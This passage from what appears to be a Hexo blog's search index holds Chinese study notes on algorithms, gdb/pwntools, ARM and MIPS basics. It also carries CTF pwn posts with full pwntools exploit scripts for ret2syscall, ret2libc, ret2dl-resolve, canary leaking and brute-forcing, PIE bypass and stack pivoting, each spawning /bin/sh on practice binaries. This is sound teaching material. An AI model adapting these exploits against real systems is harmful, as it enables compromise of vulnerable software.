&gt;&gt; x &gt;&gt; c; add.push_back(&#123;x, c&#125;); alls.push_back(x); &#125; for(int i = 0; i &lt; m; i ++ ) &#123; int l, r; cin &gt;&gt; l &gt;&gt; r; query.push_back(&#123;l, r&#125;); alls.push_back(l); alls.push_back(r); &#125; sort(alls.begin(), alls.end()); alls.erase(unique(alls), alls.end()); for(auto item : add) &#123; int x = find(item.first); a[x] += item.second; &#125; for(int i = 1; i &lt;= alls.size(); i ++ ) s[i] = s[i - 1] + a[i]; for(auto item : query) &#123; int l = find(item.first), r = find(item.second); cout &lt;&lt; s[r] - s[l - 1] &lt;&lt; endl; &#125; return 0;&#125; 区间合并1）把要合并的区间按区间左端点从小到大排序2）用st和ed指针从前往后维护区间3）比较ed 和后一个区间的左端点，分情况更新ed和first 1234567891011121314151617181920// 将所有存在交集的区间合并void merge(vector&lt;PII&gt; &amp;segs)&#123; vector&lt;PII&gt; res; sort(segs.begin(), segs.end()); int st = -2e9, ed = -2e9; for (auto seg : segs) //定义了一个自动类型变量seg, seg的取值从segs[0]开始到segs末尾，也就是遍历了segs if (ed &lt; seg.first) &#123; if (st != -2e9) res.push_back(&#123;st, ed&#125;); st = seg.first, ed = seg.second; &#125; else ed = max(ed, seg.second); if (st != -2e9) res.push_back(&#123;st, ed&#125;); segs = res;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"快排","slug":"快排","permalink":"http://example.com/tags/%E5%BF%AB%E6%8E%92/"},{"name":"归并","slug":"归并","permalink":"http://example.com/tags/%E5%BD%92%E5%B9%B6/"},{"name":"二分","slug":"二分","permalink":"http://example.com/tags/%E4%BA%8C%E5%88%86/"},{"name":"差分","slug":"差分","permalink":"http://example.com/tags/%E5%B7%AE%E5%88%86/"}]},{"title":"pwndbg/pwntools","slug":"pwn入门","date":"2022-07-05T16:00:00.000Z","updated":"2022-07-06T07:57:03.183Z","comments":true,"path":"2022/07/06/pwn入门/","link":"","permalink":"http://example.com/2022/07/06/pwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"pwndbg&#x2F;gdb的使用X的使用x 是 examine 的缩写 n 表示要显示的内存单元的个数 u 表示一个地址单元的长度： b 表示单字节h 表示双字节w 表示四字节g 表示八字节f 表示显示方式，可取如下值： x 按十六进制格式显示变量d 按十进制格式显示变量u 按十进制格式显示无符号整型o 按八进制格式显示变量t 按二进制格式显示变量a 按十六进制格式显示变量i 指令地址格式c 按字符格式显示变量f 按浮点数格式显示变量举例x &#x2F;20gx buf: 表示从内存地址 buf 读取内容，g 表示八字节，20 表示 20 个单位，x 按十六进制格式显示变量 x &#x2F;3hu buf：表示从内存地址 buf 读取内容，h 表示以双字节为一个单位，3 表示三个单位，u 表示十进制格式显示无符号整型 P的使用打印指令p(print)：p fun_name &#x2F;&#x2F;打印fun_name的地址，需要保留符号p 0x10-0x08 &#x2F;&#x2F;计算0x10-0x08的结果p &amp;a &#x2F;&#x2F;查看变量a的地址p *(0x123456) &#x2F;&#x2F;查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号p $rdi &#x2F;&#x2F;显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值p *($rdi) &#x2F;&#x2F;显示rdi指向的值 cycliccyclic n ：生成长度为n的字符串 cyclic -l aaaa #查找偏移（一般是返回地址 假如说我想找aaaj这个字符串的偏移，我们可以用 1cyclic_find(&#x27;aaaj&#x27;) 其他info all-registers 查看所有的寄存器的值 pwntools的使用p32 p64就是将一个数字转换为字符，例如 1p32(0xdeadbeef) 就会转换为 1&#x27;\\xef\\xbe\\xad\\xde&#x27; 这里顺序反了是因为linux编译的程序是小端序的 u32 u64就是将字符转换为数字，","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"入门","slug":"入门","permalink":"http://example.com/tags/%E5%85%A5%E9%97%A8/"}],"author":"1ens"},{"title":"栈溢出","slug":"栈溢出","date":"2022-07-05T16:00:00.000Z","updated":"2022-07-14T08:31:00.199Z","comments":true,"path":"2022/07/06/栈溢出/","link":"","permalink":"http://example.com/2022/07/06/%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"ret2syscallLinux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数 应用程序调用系统调用的过程是： 1、把系统调用的编号存入 EAX 2、把函数参数存入其它通用寄存器 3、触发 0x80 号中断（int 0x80） 在32位下： 1.将EAX寄存器的值设置为OXb:EAX &#x3D; OXb 3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; 0 3.将ECX和EDX寄存器的值都设为O: ECX &#x3D; EDx &#x3D; o 64位下： 1.将RAX寄存器的值设置为0×3b:RAX &#x3D; OX3b 2.将RDI寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:RDI &#x3D; &amp;(“ &#x2F;bin&#x2F;sh”) 3.将RSI和RDX寄存器的值都设为0: RSI &#x3D; RDX &#x3D; o 只需要让栈顶的值 然后可以通过 pop eax 达到目的 例（CTFwiki）： 计算偏移 运用ropper 查找int 0x80系统调用 1ropper -f ret2syscall --search &quot;int 0x80&quot; 运用ropper 查找其他寄存器 1ropper -f ret2syscall --search &quot;pop|ret&quot;| grep &#x27;eax&#x27; 其他类推 在IDA找到bin&#x2F;sh的地址 exp: 123456789101112131415161718192021222324from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./ret2syscall&quot;)if args.G: gdb.attach(p)pop_eax_ret = 0x080bb196pop_ebx_ret = 0x080481c9pop_ecx_ebx_ret = 0x0806eb91pop_edx_ecx_ebx_ret = 0x0806eb90pop_edx_ret = 0x0806eb6aint_0x80 = 0x08049421bin_sh_addr = 0x80be408p.recvuntil(&quot;What do you plan to do?\\n&quot;)payload = b&quot;a&quot;*112 + p32(pop_eax_ret) payload += p32(0xb) + p32(pop_edx_ecx_ebx_ret) payload += p32(0) + p32(0) + p32(bin_sh_addr) payload += p32(int_0x80)p.sendline(payload)p.interactive() ret2libc 例1：在ida找到bin&#x2F;sh字符串地址 查找到system函数存在地址 123456from pwn import *p = process(&quot;./ret2libc1&quot;)p.recvuntil(&quot;RET2LIBC &gt;_&lt;\\n&quot;)payload = b&quot;a&quot;*112 + p32(0x8048460) + b&quot;xxxx&quot; + p32(0x8048720)p.sendline(payload)p.interactive() 例2没有system函数。也没有binsh字符串 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 https://github.com/niklasb/libc-database 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。 基本利用思路如下 泄露 puts函数 地址 获取 libc 版本 获取 system 地址与 &#x2F;bin&#x2F;sh 的地址 再次执行源程序 触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’) 单步运行过puts函数，查询got表 通过vmmap找到对应libc的基地址，并且计算偏移 再计算system函数的偏移 然后searh “bin&#x2F;sh”的地址，再计算bin&#x2F;sh1的偏移 123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./ret2libc2&quot;)if args.G: gdb.attach(p)gets_plt = 0x8048440puts_plt = 0x8048460main_addr = 0x8048618puts_got = 0x804a018p.recvuntil(&quot;Can you find it !?&quot;)payload = b&quot;a&quot;*112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)p.sendline(payload)puts_addr = u32(p.recv(4))libc_addr = puts_addr - 0x6dc30system_addr = libc_addr + 0x41790bin_sh_addr = libc_addr + 0x18e363success(&quot;puts_addr: &quot; + hex(puts_addr))success(&quot;system_addr: &quot; + hex(system_addr))success(&quot;bin_sh_addr: &quot; + hex(bin_sh_addr))p.recvuntil(&quot;Can you find it !?&quot;)payload1 = b&quot;a&quot;*104 + p32(system_addr) + b&quot;xxxx&quot; + p32(bin_sh_addr)#payload1 = b&quot;a&quot;*104 + p32(gets_plt) + p32(system_addr) + p32(0x804a020) + p32(0x804a020)p.sendline(payload1)&#x27;&#x27;&#x27;sleep(0.2)p.sendline(&quot;/bin/sh\\x00&quot;)&#x27;&#x27;&#x27;p.interactive() ret2dl ELF关于动态链接的关键segment： .dynamic:一般保存了ELF文件依赖于哪些动态库,动态符号节信息; 各segment的位置关系: .dynamic的地址加Ox44的位置是. dynstr;.dynamic的地址加Ox4c的位置是. dynsym;.dynamic的地址加Ox84的位置是.rel.plt; 第一次调用一个函数时_dl_runtime_resolve函数的工作: _dl_runtime resolve(link map_obj, reloc index)： 1.首先用link_map访问.dynamic，分别取出.dynstr、.dynsym、.rel.plt的地址; 2..rel.plt ＋参数reloc_index,求出当前函数的重定位表项Elf32_Rel的指针，记作rel; 3.rel-&gt;r_info &gt; &gt;8&#x3D; n作为.dynsym的下标，求出当前函数的符号表项Elf32_Sym的指针，记作sym;4..dynstr + sym-&gt;st_name得出符号名字符串指针; 5.在动态链接库查找这个函数的地址，并且把地址赋值给*rel-&gt;r_offset，即GOT表; 6.最后调用这个函数; 例题： 思路: exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27; ,&#x27;-c&#x27;]name = &#x27;./pwn&#x27;p = process(name)#p=remote(&#x27;chall.pwnable.tw&#x27;, 10103)elf= ELF(name)#libc = ELF(&#x27;./libc_32.so.6&#x27;)if args.G: gdb.attach(p) rel_plt_addr = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addr #0x8048330dynsym_addr = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addr #0x80481d8dynstr_addr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr #0x8048278resolve_plt = 0x08048380leave_ret_addr = 0x0804851d start = 0x804aa00fake_rel_plt_addr = startfake_dynsym_addr = fake_rel_plt_addr + 0x8fake_dynstr_addr = fake_dynsym_addr + 0x10bin_sh_addr = fake_dynstr_addr + 0x7n = fake_rel_plt_addr - rel_plt_addrr_info = (int((fake_dynsym_addr - dynsym_addr)/0x10) &lt;&lt; 8) + 0x7str_offset = fake_dynstr_addr - dynstr_addrfake_rel_plt = p32(elf.got[&#x27;read&#x27;]) + p32(r_info)fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)fake_dynstr = b&quot;system\\x00/bin/sh\\x00\\x00&quot;pay1 = b&#x27;a&#x27;*108 + p32(start - 20) + p32(elf.plt[&#x27;read&#x27;]) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)p.recvuntil(&#x27;Welcome to RET_TO_DL~!\\n&#x27;)#p.recvuntil(&quot;Nice to meet you~!\\n&quot;)p.sendline(pay1)sleep(1)pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + b&#x27;aaaa&#x27; + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstrp.sendline(pay2)success(&quot;.rel_plt: &quot; + hex(rel_plt_addr))success(&quot;.dynsym: &quot; + hex(dynsym_addr))success(&quot;.dynstr: &quot; + hex(dynstr_addr))success(&quot;fake_rel_plt_addr: &quot; + hex(fake_rel_plt_addr))success(&quot;fake_dynsym_addr: &quot; + hex(fake_dynsym_addr))success(&quot;fake_dynstr_addr: &quot; + hex(fake_dynstr_addr))success(&quot;n: &quot; + hex(n))success(&quot;r_info: &quot; + hex(r_info))success(&quot;offset: &quot; + hex(str_offset))success(&quot;system_addr: &quot; + hex(fake_dynstr_addr))success(&quot;bss_addr: &quot; + hex(elf.bss()))p.interactive() 击败cancary基本原理函数开始执行的时候会先往栈底插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法(栈帧销毁前测试该值是否被改 变)，如果不合法就停止程序运行(发生了栈溢出); 在Linux当中我们将这段cookie信息称为Canary ,Canary是一个低字节为\\x00的16进制数; 因为Canary在局部变量的后边,在EBP或RBP的前面所以当攻击者覆盖返回地址的时候往往也会将cookie信息给覆盖掉,这就会导致栈保护检查失败而阻止payload的执行,从而避免漏洞利用成功. 绕过方法方法一:泄露栈中的Canary: Canary设计为以字节×O0O结尾,其本意就是为了保证Canary 可以截断字符串,防止我们输出字符串的时候将Canary打印出来;所以泄露栈中的Canary的思路是将Canary的低字节\\x00覆盖，然后连同用户的字符串一起打印出剩余的Canary部分; 当我们打印出完整的Canary后,在溢出的时候再将正确Canary填回去,就可以进行控制返回地址,控制程序流程了. 条件: 1.有合适的输出函数 2.泄露Canary后程序不会崩溃 例题： exp： 12345678910111213141516171819202122232425from pwn import *#context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]name = &#x27;./pwn1&#x27;p = process(name)elf = ELF(name)if args.G: gdb.attach(p)p.recvuntil(&quot;Welcome!\\n&quot;)payload = &quot;a&quot;*28 + &quot;b&quot;*4p.sendline(payload)p.recvuntil(&quot;bbbb&quot;)canary = u32(p.recv(4)) - 0xasuccess(&quot;canary: &quot; + hex(canary))getshell_addr = 0x804858bpayload1 = b&quot;a&quot;*32 + p32(canary) + b&quot;b&quot;*12 + p32(getshell_addr)p.sendline(payload1)p.interactive() 方法二:爆破Canary: 对于Canary,虽然每次进程重启后的Canary 不同(相比GS，GS重启后是相同的)但是同一个进程中的不同线程的Canary 是相同的,并且通过fork函数创建的子进程的Canary也是相同的,因为fork函数会直接拷贝父进程的内存。 我们可以利用这样的特点，彻底逐个字节将Canary爆破出来. 缺点:多进程程序,32位程序需要爆破3字节,64位程序需要爆破7字节,需要爆破较多. 其他方法: 1.联合其他漏洞修改劫持_stack_chk_fail函数; 例题： 1234567891011121314151617181920212223242526from pwn import *name = &#x27;./pwn2&#x27;p = process(name)elf = ELF(name)p.recvuntil(&#x27;welcome\\n&#x27;)canary = &#x27;\\x00&#x27;for i in range(3): print(hex(i)) for j in range(256): print(hex(j)) p.send(&#x27;a&#x27;*100 + canary + chr(j)) a = p.recvuntil(&quot;welcome\\n&quot;) if b&quot;recv&quot; in a: canary += chr(j) breakcanary = u32(canary)success(&quot;canary: &quot; + hex(canary))getflag = 0x0804863Bpayload = b&#x27;a&#x27;*100 + p32(canary) + b&#x27;a&#x27;*12 + p32(getflag)p.sendline(payload)p.interactive() PIE绕过：position-independent executable,地址无关可执行文件,该技术就是一个针对代码段.text,数据段.*data，.bss等固定地址的一个防护技术应用了PIE的程序会在每次加载时都变换加载基址，从而使ropper等工具无法得到准确的地址. 方法一: Partial Write部分写入技术,由于内存的页载入机制，PIE的随机化只能影响到单个内存页;通常来说,一个内存页大小为Ox1000,这就意味着不管地址怎么变，某条指令的后12位，3个十六进制数的地址是始终不变的就是利用了PIE后12位地址不变的特点,通过覆盖EIP的后8或16位(按字节写入每字节8位)就可以快速爆破或者直接劫持EIP; 特点: 1.程序不大,有后门函数等;2.只需要爆破一个字节 例题 1234567891011121314151617181920212223242526272829from pwn import *i = 0while True: i += 1 print (i) if(i &gt; 0xff): print(&quot;Wrong!&quot;) break io = process(&quot;./partial_write&quot;) io.recv() payload = &#x27;a&#x27;*40 payload += &#x27;\\xca&#x27; #strncpy复制202个字节造成溢出 io.sendline(payload) io.recv() payload = &#x27;a&#x27;*200 payload += &#x27;\\x01\\x39&#x27; #frontdoor的地址后三位是0x900, +1跳过push rbp 爆破的是3 io.sendline(payload) io.recv() try: io.recv(timeout = 1) except EOFError: io.close() continue else: sleep(0.1) io.sendline(&#x27;/bin/sh\\x00&#x27;) sleep(0.1) io.interactive() #没有EOFError的话就是爆破成功，可以开shell break 方法二:直接泄露地址因为PIE影响的只是程序加载基址，并不会影响指令间的相对地址,如果我们可以泄露出一个程序或ibc的某些地址，我们就可以利用地址减去偏移地址得到基地址,从而算出其他函数的地址,这种方法也是我们最常用的方法.通过泄露地址来计算libc基地址的时候需要注意的是libc版本不同,对应的偏移也不同. 例题： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]name = &#x27;./pwn1&#x27;p = process(name)elf = ELF(name)if args.G: gdb.attach(p)p.recvuntil(&quot;Tell me your name:\\n&quot;)payload = &quot;a&quot;*8p.send(payload)p.recvuntil(&quot;a&quot;*8)pro_addr = u64(p.recv(6) + b&quot;\\x00\\x00&quot;) - 0x82dputs_got_addr = pro_addr + elf.got[&#x27;puts&#x27;]puts_plt_addr = pro_addr + elf.plt[&#x27;puts&#x27;]main_addr = pro_addr + elf.symbols[&#x27;main&#x27;]success(&quot;pro_addr: &quot; + hex(pro_addr))success(&quot;puts_got_addr: &quot; + hex(puts_got_addr))success(&quot;puts_plt_addr: &quot; + hex(puts_plt_addr))success(&quot;main_addr: &quot; + hex(main_addr))p.recvuntil(&quot;What do you want to say?\\n&quot;)pop_rdi_addr = pro_addr + 0x843payload1 = b&quot;a&quot;*184 payload1 += p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr)payload1 += p64(main_addr)p.sendline(payload1)p.recvuntil(&quot;Bye!\\n&quot;)libc_addr = u64(p.recv(6) + b&quot;\\x00\\x00&quot;) - 0x68f90system_addr = libc_addr + 0x3f480bin_sh_addr = libc_addr + 0x1619d9success(&quot;libc_addr: &quot; + hex(libc_addr))success(&quot;system_addr: &quot; + hex(system_addr))success(&quot;bin_sh_addr: &quot; + hex(bin_sh_addr))p.recvuntil(&quot;Tell me your name:\\n&quot;)p.sendline(&quot;aaa&quot;)p.recvuntil(&quot;What do you want to say?\\n&quot;)payload2 = b&quot;c&quot;*184 payload2 += p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr) p.sendline(payload2)p.interactive() 整数溢出：类型一:未限制范围这种情况主要是变量有固定大小的字节,但是却允许我们输入无限多的数据,和gets()函数产生的栈溢出很相似 类型二:错误的类型转换正确的对变量进行了约束但是在类型转换上面出错了,范围大的变量赋值给范围小的变量 例题： 程序为dest分配了0x14字节的储存空间，而第二个read函数可以读取0x199个字节，这个地方存在栈溢出 12345678910111213from pwn import *p = process(&quot;./int_over&quot;)payload = b&quot;a&quot;*24 + p32(0x804868b)payload += b&quot;b&quot;*(0x104 - len(payload))p.recvuntil(&quot;Your choice:&quot;)p.sendline(&quot;1&quot;)p.recvuntil(&quot;Please input your username:\\n&quot;)p.sendline(&quot;sir&quot;)p.recvuntil(&quot;Please input your passwd:\\n&quot;)p.sendline(payload)p.interactive 栈迁移：劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP等操作;通俗的讲其实就是将ESP或RSP指针修改为我们可以控制的内存区地址比如bss段堆等位置,然后在可控内存区当中布置payload等; 条件: 1.程序存在溢出;2.可以控制sp指针; 用途: 1.栈益出可以溢出的空间大小不足 因为我们的主要思想是修改sp指针,所以我们需要通过一些汇编指令来修改sp指针,常用汇编指令:; 1.pop esp;2.pop ecx; lea esp,[ecx-Ox4];3.leave; ret; —&gt; mov esp, ebp; pop ebp; ret; 需要注意的地方: 1.迁移过去的内存一定要可读可写; ⒉.迁移过去的内存要注意离不可读不可写的内存要远一些,因为调用一些函数的时候需要较大的栈空间; 3.我们构造的栈空间和程序的栈空间有相同的性质,即push,pop等操作对sp,bp指针的操作一样; 例题： 1234567891011121314151617181920212223242526272829from pwn import *context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]p = process(&quot;./test1&quot;)if args.G: gdb.attach(p)bin_sh_addr = 0x80495d0system_plt = 0x8048370read_plt = 0x8048340leave_ret = 0x80484d5pop3_ret = 0x080485a9gadgets = 0x8048549bss = 0x804a560payload = p32(read_plt) + p32(pop3_ret) + p32(0) + p32(bss) + p32(100) payload += p32(gadgets) + p32(bss + 4)p.recvuntil(&quot;Hello,tell me your story:\\n&quot;)p.sendline(payload)payload1 = b&quot;b&quot;*10 + p32(0x804a060 + 4)p.recvuntil(&quot;By the way, what&#x27;s your name:\\n&quot;)p.sendline(payload1)sleep(1)payload2 = p32(system_plt) + b&quot;aaaa&quot; + p32(bin_sh_addr) p.sendline(payload2)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"栈溢出","slug":"栈溢出","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}],"author":"1ens"},{"title":"armpwn入门","slug":"armpwn入门","date":"2022-07-04T16:00:00.000Z","updated":"2022-07-05T13:57:05.731Z","comments":true,"path":"2022/07/05/armpwn入门/","link":"","permalink":"http://example.com/2022/07/05/armpwn%E5%85%A5%E9%97%A8/","excerpt":"","text":"调试 常用命令info functions ：显示程序的使用的函数 disassemble 函数名 ：反汇编指定函数 查看内存命令x&#x2F;&lt;n&#x2F;f&#x2F;u&gt; n是一个正整数，表示显示内存的长度f 表示显示的格式 u表示从当前地址往后请求的字节数(u参数可以用下面的字符来代替b表示单字节，h表示双字节，w表示四字节，g表示八字节) 编译arm架构程序并用qemu执行1234#编译arm-linux-gnueabihf-gcc -g hello.c -o eastgets#qemu执行 动态链接程序，需要指定libc的位置qemu-arm -L /usr/arm-linux-gnueabihf/ ./eastgets typo(例题) 32位arm小端，静态编译，没有符号表 恢复符号表对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表 https://www.freebuf.com/articles/terminal/134980.html arm架构的libc在 &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib里面 尝试恢复符号表： （1）下载对应libc.so sudo apt install libc6-armhf-cross cp &#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;lib&#x2F;libc-2.23.so .&#x2F; （2）下载rizzo插件 使用rizzo插件： https://github.com/fireundubh/IDA7-Rizzo 放入：C:\\Program Files\\IDA 7.0\\plugins （3）用IDA打开libc-2.23.so 导出libc.23.so.riz: File-&gt;Produce file-&gt;Rizzo signature file （4）打开目标程序 加载.riz: File-&gt;Load file-&gt;Rizzo signature file 溢出函数 arm架构下32bit程序，函数的前四个参数分别保存在r0~r3寄存器中，其余的参数在栈中，函数返回值 保存在寄存器r0中。 找到0x20904，将“&#x2F;bin&#x2F;sh”地址赋给r0，并将system的地址赋给pc，就可以执行system(“&#x2F;bin&#x2F;sh”) 12345678from pwn import *payload = &quot;A&quot;*112 + p32(0x20904) + p32(0x6c384)*2 + p32(0x110b4)p = process(&quot;./typo&quot;)p.recvuntil(&quot;quit&quot;)p.send(&quot;\\n&quot;)p.recvuntil(&quot;----&quot;)p.sendline(payload)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://example.com/categories/pwn/"}],"tags":[{"name":"arm","slug":"arm","permalink":"http://example.com/tags/arm/"}],"author":"1ens"},{"title":"mips基础","slug":"Mips基础","date":"2022-07-02T16:00:00.000Z","updated":"2022-07-04T23:36:37.567Z","comments":true,"path":"2022/07/03/Mips基础/","link":"","permalink":"http://example.com/2022/07/03/Mips%E5%9F%BA%E7%A1%80/","excerpt":"","text":"基本特点 寄存器 流水线操作 寻址方式 指令格式 指令集基础运算 逻辑运算 移位运算 访存 跳转 CPU控制指令 其他指令","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"mips","slug":"mips","permalink":"http://example.com/tags/mips/"}],"author":"1ens"},{"title":"arm基础","slug":"arm基础","date":"2022-06-30T16:00:00.000Z","updated":"2022-07-01T13:39:44.089Z","comments":true,"path":"2022/07/01/arm基础/","link":"","permalink":"http://example.com/2022/07/01/arm%E5%9F%BA%E7%A1%80/","excerpt":"","text":"arm工作模式ARM之所以设计出这么多种模式出来，就是为了「应对CPU在运行时各种突发事件」，比如要支持正常的应用程序的运行，在运行任何一个时间点又可能发生很多异常事件，比如：关机、收到网卡信息、除数为0、访问非法内存、解析到了非法指令等等，不光要能处理这些异常还要能够从异常中再返回到原来的程序继续执行。 两种工作状态1、ARM状态：32位，ARM状态执行字对齐的32位ARM指令。 2、Thumb状态，16位，执行半字对齐的16位指令。 注：1、ARM和Thumb两种状态之间的切换不影响处理器的工作模式和寄存器的内容。 ​ 2、ARM处理器在处理异常时，不管处理器处于什么状态，则都将切换到ARM状态。 寄存器 通用寄存器包括R0~R15,可以分为3类: 未分组寄存器R0~R7 分组寄存器R8~R14、R13(SP) 、R14(LR) 程序计数器PC(R15)、R8_fiq-R12_fir为快中断独有 1. 未分组寄存器R0~R7在所有运行模式下,未分组寄存器都指向同一个物理寄存器,它们未被系统用作特殊的用途.因此在中断或异常处理进行运行模式转换时,由于不同的处理器运行模式均使用相同的物理寄存器,所以可能造成寄存器中数据的破坏。 2. 分组寄存器R8~R14对于分组寄存器,它们每一次所访问的物理寄存器都与当前处理器的运行模式有关。 对于R8R12来说,每个寄存器对应2个不同的物理寄存器,当使用FIQ(快速中断模式)时,访问寄存器 R8_fiqR12_fiq;当使用除FIQ模式以外的其他模式时,访问寄存器R8_usr~R12_usr。 对于R13,R14来说,每个寄存器对应7个不同的物理寄存器,其中一个是用户模式与系统模式共用,另外6个物理寄存器对应其他6种不同的运行模式,并采用以下记号来区分不同的物理寄存器: 1R13_mode R14_mode 其中mode可为:「usr,fiq,irq,svc,abt,und，mon」。 3. 寄存器R13（sp）在ARM指令中常用作「堆栈指针」,用户也可使用其他的寄存器作为堆栈指针,而在Thumb指令集中,某些指令强制性的要求使用R13作为堆栈指针。 寄存器R13在ARM指令中常用作堆栈指针，但这只是一种习惯用法，用户也可使用其他的寄存器作为堆栈指针。而在Thumb指令集中，某些指令强制性的要求使用R13作为堆栈指针。 由于处理器的每种运行模式均有自己独立的物理寄存器R13，在用户应用程序的初始化部分，一般都要初始化每种模式下的R13，使其指向该运行模式的栈空间。这样，当程序的运行进入异常模式时，可以将需要保护的寄存器放入R13所指向的堆栈，而当程序从异常模式返回时，则从对应的堆栈中恢复，采用这种方式可以保证异常发生后程序的正常执行。 4. R14（LR）链接寄存器(Link Register)当执行子程序调用指令(BL)时,R14可得到R15(程序计数器PC)的备份。 在每一种运行模式下，都可用R14保存子程序的返回地址，当用BL或BLX指令调用子程序时，将PC的当前值复制给R14，执行完子程序后，又将R14的值复制回PC，即可完成子程序的调用返回。以上的描述可用指令完成。 从子程序返回：「方法1：」 123 MOV PC, LR或者 BX LR 「方法2：」 在子程序入口处使用以下指令将R14存入堆栈： 1STMFD SP！,&#123;,LR&#125; 对应的，使用以下指令可以完成子程序返回： 1LDMFD SP！,&#123;,PC&#125; 5. R15(PC)程序状态寄存器寄存器R15用作程序计数器(PC),在ARM状态下,位[1:0]为0,位[31:2]用于保存PC,在Thumb状态下,位[0]为0,位[31:1]用于保存PC。 比如如果pc的值是0x40008001,那么在寻址的时候其实会查找地址0x40008000，低2位会自动忽略掉。「个中原因，请读者自己思考?」 由于ARM体系结构采用了多级流水线技术，对于ARM指令集而言，PC总是指向当前指令的下两条指令的地址,即PC的值为当前指令的地址值加8个字节。 1即：PC值=当前程序执行位置+8 6. CPSR、SPSR「CPSR」(Current Program Status Register，当前程序状态寄存器)，CPSR可在任何运行模式下被访问，它包括条件标志位、中断禁止位、当前处理器模式标志位，以及其他一些相关的控制和状态位。 每一种运行模式下又都有一个专用的物理状态寄存器，称为「SPSR」(Saved Program Status Register，备份的程序状态寄存器)，当异常发生时，SPSR用于保存CPSR的当前值，从异常退出时则可由SPSR来恢复CPSR。 由于用户模式和系统模式不属于异常模式，它们没有SPSR，当在这两种模式下访问SPSR，结果是未知的。 寄存器CPSR格式如下： 条件码标志(condition code flags) 「N,Z,C,V」均为条件码标志位,它们的内容可被算术或逻辑运算的结果所改变,并且可以决定某条指令是否被执行。 在ARM状态下,绝大多数的指令都是有条件执行的,在Thumb状态下,仅有分支指令是有条件执行的。 「N (Number)」: 当用两个补码表示的带符号数进行运算时,N&#x3D;1表示运行结果为负,N&#x3D;0表示运行结果为正或零 「Z :(Zero)」: Z&#x3D;1表示运算结果为零,Z&#x3D;0表示运行结果非零 「C」 : 可以有4种方法设置C的值： (Come)加法运算(包括CMP):当运算结果产生了进位时C&#x3D;1,否则C&#x3D;0 减法运算(包括CMP):当运算产生了借位,C&#x3D;0否则C&#x3D;1 对于包含移位操作的非加&#x2F;减运算指令 ,C为移出值的最后一位 对于其他的非加&#x2F;减运算指令C的值通常不改变 「V」 :(oVerflow)对于加&#x2F;减法运算指令,当操作数和运算结果为二进制的补码表示的带符号位溢出时,V&#x3D;1表示符号位溢出;对于其他的非加&#x2F;减运算指令V的值通常不改变 「Q」： 在ARM V5及以上版本的E系列处理器中，用Q标志位指示增强的DSP运算指令是否发生了溢出。在其它版本的处理器中，Q标志位无定义 「J：」仅ARM v5TE-J架构支持 , T&#x3D;0;J &#x3D; 1 处理器处于Jazelle状态,也可以和其他位组合. 「E位：」 大小端控制位 「A位：」 A&#x3D;1 禁止不精确的数据异常 